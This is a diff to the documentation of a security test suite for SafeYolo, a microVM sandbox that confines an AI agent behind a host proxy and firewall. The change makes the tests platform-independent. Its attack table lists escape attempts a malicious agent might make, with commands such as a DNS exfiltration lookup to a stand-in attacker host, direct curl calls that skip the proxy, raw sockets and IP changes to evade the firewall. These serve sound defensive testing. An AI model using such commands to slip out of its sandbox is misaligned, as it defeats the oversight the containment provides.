@@ -13,9 +13,26 @@ If these tests pass, the security contract holds. If they fail, nothing else mat
 vantage point — inside the microVM where the agent runs. If the attacker can't get out,
 the implementation is correct regardless of which mechanism enforces it.
 
-**Never duplicate production logic.** Tests use the real proxy with real addons, real pf
-rules, real VirtioFS mounts, and real TLS verification. No mocks, no `ssl_insecure=true`,
-no shortcuts. A fix to production automatically fixes the tests.
+**Platform-independent assertions.** The guest is always Linux. A test that runs
+`curl --noproxy '*' http://1.1.1.1` doesn't know or care whether pf (macOS) or
+iptables (Linux) dropped the packet. Test files assert outcomes, never mechanisms.
+They must never contain `if platform == ...` branches.
+
+**Platform-specific harness only.** The only platform-dependent code is the thin
+harness layer that stands up the VM, proxy, sinkhole, and network isolation.
+Everything else — test files, fixtures, sinkhole client, assertions — is shared.
+
+| Layer | Shared or Platform-specific |
+|-------|----------------------------|
+| Test files (`test_*.py`) | Shared |
+| Fixtures (`conftest.py`) | Shared |
+| Sinkhole server | Shared |
+| Certificates | Shared |
+| VM + network harness (`run-tests.sh`) | Platform-specific |
+
+**Never duplicate production logic.** Tests use the real proxy with real addons, real
+firewall rules, real VirtioFS mounts, and real TLS verification. No mocks, no
+`ssl_insecure=true`, no shortcuts. A fix to production automatically fixes the tests.
 
 **Ground truth TLS.** The test harness uses a dedicated test CA that signs sinkhole
 certificates. SafeYolo verifies these the same way it verifies production certs.
@@ -49,11 +66,11 @@ run from inside a real microVM with the same configuration as production.
 
 | Test | Attack Vector | Expected Result |
 |------|--------------|-----------------|
-| Direct HTTP to external IP | `curl --noproxy '*' http://1.1.1.1` | Connection dropped (pf) |
-| Direct HTTPS to external IP | `curl --noproxy '*' https://8.8.8.8` | Connection dropped (pf) |
-| DNS exfiltration | `nslookup secret.attacker.com 8.8.8.8` | No route (pf blocks UDP) |
+| Direct HTTP to external IP | `curl --noproxy '*' http://1.1.1.1` | Connection dropped (firewall) |
+| Direct HTTPS to external IP | `curl --noproxy '*' https://8.8.8.8` | Connection dropped (firewall) |
+| DNS exfiltration | `nslookup secret.attacker.com 8.8.8.8` | No route (firewall blocks UDP) |
 | Raw socket bypass | `SOCK_RAW` to external IP | Dropped at kernel level |
-| IP reconfiguration | `ip addr` change to evade pf rules | pf matches original subnet |
+| IP reconfiguration | `ip addr` change to evade firewall | Firewall matches original subnet |
 | Proxy reachable | `curl` through proxy | 200 (the one allowed path) |
 
 #### Privilege Escalation
@@ -99,9 +116,9 @@ the private key, it can sign certificates for any domain and bypass all inspecti
 │  └────┬──────┘  └──────┬──────┘ │
 │       │ HTTP_PROXY     │        │
 │  ─────┼────────────────┼──────  │
-│       │    eth0 (feth)  │       │
+│       │    eth0         │       │
 └───────┼─────────────────┼───────┘
-        │ pf rules        │
+        │ firewall rules  │
         ▼                 ▼
 ┌───────────────┐  ┌─────────────┐
 │  mitmdump     │  │  Sinkhole   │
@@ -110,10 +127,10 @@ the private key, it can sign certificates for any domain and bypass all inspecti
 └───────────────┘  └─────────────┘
 ```
 
-- **microVM**: Real VM via Apple Virtualization.framework, same config as production
+- **microVM**: Real VM, same config as production (Virtualization.framework on macOS, KVM on Linux)
 - **mitmdump**: Host-side proxy with full addon chain (credential guard, network guard, etc.)
 - **Sinkhole**: Captures upstream traffic to prove what actually reached the destination
-- **pf**: macOS packet filter rules enforcing network isolation on feth interfaces
+- **Firewall**: Host-side packet filter enforcing network isolation (pf on macOS, iptables/nftables on Linux)
 - **Test runner**: pytest inside the VM, proving security properties from the adversary's perspective
 
 ## Running
@@ -136,4 +153,6 @@ When adding a new test, ask: *"What would a malicious agent try?"*
 1. Identify the attack vector (network bypass, privilege escalation, data exfiltration, etc.)
 2. Write the test from inside the VM — prove the attack fails
 3. If the test involves upstream traffic, use the sinkhole to verify what actually arrived
-4. Add the test to the appropriate suite above
+4. Assert the outcome, not the mechanism — never reference pf, iptables, feth, or any
+   platform-specific detail in test files
+5. Add the test to the appropriate suite above
